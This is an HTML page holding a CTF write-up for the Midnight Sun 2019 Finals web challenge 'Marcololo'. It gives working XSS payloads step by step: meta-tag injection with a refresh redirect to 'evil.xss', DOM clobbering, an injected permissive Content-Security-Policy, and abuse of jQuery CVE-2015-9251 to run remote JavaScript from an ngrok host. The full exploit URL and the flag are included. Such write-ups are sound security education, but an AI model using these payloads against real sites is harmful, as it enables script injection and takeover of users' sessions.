@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="chrome=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="no-referrer">
+
+<meta name="description" content="A tasteful blog about Computer Security and cars. I break stuff unintentionally so you don&#39;t have to.">
+
+<meta name="twitter:card" content="summary">
+<meta name="twitter:domain" content="https://tasteofsecurity.com/">
+
+<meta name="twitter:image" content="https://tasteofsecurity.com/tn.png">
+<meta name="twitter:title" property="og:title" itemprop="title name" content="A taste of security">
+<meta name="twitter:description" property="og:description" itemprop="description" content="A tasteful blog about Computer Security and cars. I break stuff unintentionally so you don&#39;t have to.">
+<meta name="og:type" content="website">
+<meta name="og:url" content="https://tasteofsecurity.com/">
+<meta name="og:image" itemprop="image primaryImageOfPage" content="https://tasteofsecurity.com/tn.png">
+
+<link rel="shortcut icon" href="https://tasteofsecurity.com/sam.ico" id="favicon">
+<link rel="stylesheet" href="https://tasteofsecurity.com/css/style.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Didact+Gothic">
+
+    
+
+    
+    
+    
+    <title>
+        
+        Midnight Sun CTF 2019 Finals Writeup: Marcololo
+        
+    </title>
+</head>
+
+<body>
+    <div class="wrap">
+        <div class="section" id="title">Midnight Sun CTF 2019 Finals Writeup: Marcololo</div>
+
+        
+<div class="section" id="content">
+    Mon Jun 17, 2019  &#183; 3 min read
+    
+    <div class="tag-container">
+        
+        <span class="tag">
+            <a href="https://tasteofsecurity.com/tags/web">
+                web
+            </a>
+        </span>
+        
+        <span class="tag">
+            <a href="https://tasteofsecurity.com/tags/ctf">
+                ctf
+            </a>
+        </span>
+        
+        <span class="tag">
+            <a href="https://tasteofsecurity.com/tags/xss">
+                XSS
+            </a>
+        </span>
+        
+        <span class="tag">
+            <a href="https://tasteofsecurity.com/tags/dom-clobbering">
+                dom clobbering
+            </a>
+        </span>
+        
+        <span class="tag">
+            <a href="https://tasteofsecurity.com/tags/midnightsunctf2019finals">
+                midnightsunctf2019finals
+            </a>
+        </span>
+        
+    </div>
+    
+    <hr/>
+    <p>First I just want to say that it was a pleasure participating in the on site finals in Stockholm. The event was amazing! Thanks to hacking for soju for organizing such an amazing event!</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">html</span>&gt;&lt;<span style="color:#f92672">head</span>&gt;
+    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span>&gt;
+    &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/style.css&#34;</span>&gt;
+    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">property</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;og:title&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;marcoloco&#34;</span>&gt;
+    &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://code.jquery.com/jquery-2.2.4.min.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+    &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/api/getuser&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+&lt;<span style="color:#f92672">script</span>&gt;
+
+<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">name</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;admin&#34;</span>){
+  <span style="color:#a6e22e">$</span>.<span style="color:#a6e22e">get</span>(<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">hash</span>.<span style="color:#a6e22e">slice</span>(<span style="color:#ae81ff">1</span>));
+}<span style="color:#66d9ef">else</span>{
+  document.<span style="color:#a6e22e">write</span>(<span style="color:#e6db74">&#34;u are not admin, fak off&#34;</span>);
+}
+
+&lt;/<span style="color:#f92672">script</span>&gt;&lt;/<span style="color:#f92672">head</span>&gt;
+
+
+&lt;<span style="color:#f92672">body</span>&gt;&lt;/<span style="color:#f92672">body</span>&gt;&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><p>This was the challenge source code. We had a XSS in the meta tag content through the <code>input</code> GET parameter. To get the flag we had to pop a alert(1).</p>
+<p>Only &lt; and &gt; were filtered so this prevented us to break out of meta tag and enter a script tag.</p>
+<p>I then though about redirects, maybe we can redirect the page to another domain and pop a alert there.</p>
+<p>Payload: 0; url=http://evil.xss&rdquo; http-equiv=&quot;refresh</p>
+<p>We successfully redirected to our evil domain with our xss. Submitted this in the payload validation.</p>
+<p><strong>Redirects to external domains were disabled unfortunately</strong></p>
+<p>Back to the drawing board&hellip;</p>
+<p>Looking at the source code once again I needed to bypass these checks.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">name</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;admin&#34;</span>){
+  <span style="color:#a6e22e">$</span>.<span style="color:#a6e22e">get</span>(<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">hash</span>.<span style="color:#a6e22e">slice</span>(<span style="color:#ae81ff">1</span>));
+}<span style="color:#66d9ef">else</span>{
+  document.<span style="color:#a6e22e">write</span>(<span style="color:#e6db74">&#34;u are not admin, fak off&#34;</span>);
+}
+</code></pre></div><p>The user.name is fetched through the <code>/api/getuser</code> endpoint.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">user</span> <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;id&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;-1&#34;</span>, <span style="color:#e6db74">&#34;name&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;guest&#34;</span>, <span style="color:#e6db74">&#34;type&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;guest&#34;</span>}
+</code></pre></div><p>Let&rsquo;s start with the first one. How can we bypass the if statement to get admin?</p>
+<p>Through <a href="http://www.thespanner.co.uk/2013/05/16/dom-clobbering/">dom clobbering</a></p>
+<p>Payload: <code>&quot; name=&quot;admin&quot; id=&quot;user</code></p>
+<p>This is now equivalent to:</p>
+<pre><code>user.name = admin
+</code></pre><p>But our payload will be overwritten by the <code>/api/getuser</code> call and we won&rsquo;t bypass the check.</p>
+<p>We can change how external scripts are loaded with content security policies (CSP).</p>
+<p>If we enter a CSP to allow everything except the /api/getuser endpoint and chain it together with the dom clobbering we get the following payload:</p>
+<p>Payload:</p>
+<pre><code>default-src * 'unsafe-inline' 'unsafe-eval'; script-src 'unsafe-inline' 'unsafe-eval' https://code.jquery.com; connect-src * 'unsafe-inline'; img-src * data: blob: '    unsafe-inline'; frame-src *; style-src * 'unsafe-inline';&quot; http-equiv=&quot;Content-Security-Policy&quot; name=&quot;admin&quot; id=&quot;user
+</code></pre><p>We now pass the first check! Yay, now time for the second part.</p>
+<p>We can place our payload after the <code>#</code> in the url. Since this is a string, we can&rsquo;t do something like alert(1) as the browser will try to navigate to this page. Also chrome won&rsquo;t allow the protocol to be changed to javascript.</p>
+<p>How can we bypass this? 
+Since the page is using an old version of jquery, we can use an old cve for jquery (<a href="https://nvd.nist.gov/vuln/detail/CVE-2015-9251">CVE-2015-9251</a>)</p>
+<p>If we read the CVE details we see that $.get will execute arbitrary javascript code from a remote url if the content type is set to text/javascript. In nginx this is per default set to application/javascript. We can modify our nginx mime config to return the correct mime type for our payload to work.</p>
+<p><strong>/etc/nginx/mime.types</strong></p>
+<pre><code>types {
+...
+8     text/javascript                       js;
+...
+</code></pre><p>Now let&rsquo;s fire up ngrok so we can access our local nginx server from outside our local network.</p>
+<p>All we have to do now is put our payload <code>alert(1)</code> in the nginx the <code>/usr/share/nginx/html/index.js</code> file.</p>
+<pre><code>./ngrok http 80
+</code></pre><p>Appending the url to our payload: <code>#7a1b9120d.ngrok.io/index.js</code></p>
+<p>Final payload:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">http://marcololo-01.play.midnightsunctf.se:3001/marcololo?input=default-src * &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;; script-src &#39;unsafe-inline&#39; &#39;unsafe-eval&#39; https://code.jquery.com; connect-src * &#39;unsafe-inline&#39;; img-src * data: blob: &#39;unsafe-inline&#39;; frame-src *; style-src * &#39;unsafe-inline&#39;;&#34; http-equiv=&#34;Content-Security-Policy&#34; name=&#34;admin&#34; id=&#34;user#http://7a1b120d.ngrok.io/index.js
+</code></pre></div><p>Submitting the url to the payload submission form, we get the flag!</p>
+<pre><code>midnight{@lw4yz_cl0b_b3f0re_34t1ng_c0rn_0n_th3_c0b}
+</code></pre>
+</div>
+
+
+        
+<div class="section bottom-menu">
+    
+<hr />
+<p>
+
+
+    
+        <a href="/security">back</a>
+        
+            &#183;
+        
+    
+    <a href="https://tasteofsecurity.com/">
+        #root
+    </a>
+    &#183; 
+    
+        
+            <a href="/security/">
+                A taste of security
+            </a>
+        
+    
+    
+        
+            &#183; 
+            <a href="/how-to/">
+                Break it, fix it.
+            </a>
+        
+            &#183; 
+            <a href="/about">
+                I&#39;m Hugo
+            </a>
+        
+    
+
+</p>
+
+</div>
+
+
+        <div class="section footer">© 2023 Hugo</div>
+    </div>
+</body>
+
+</html>
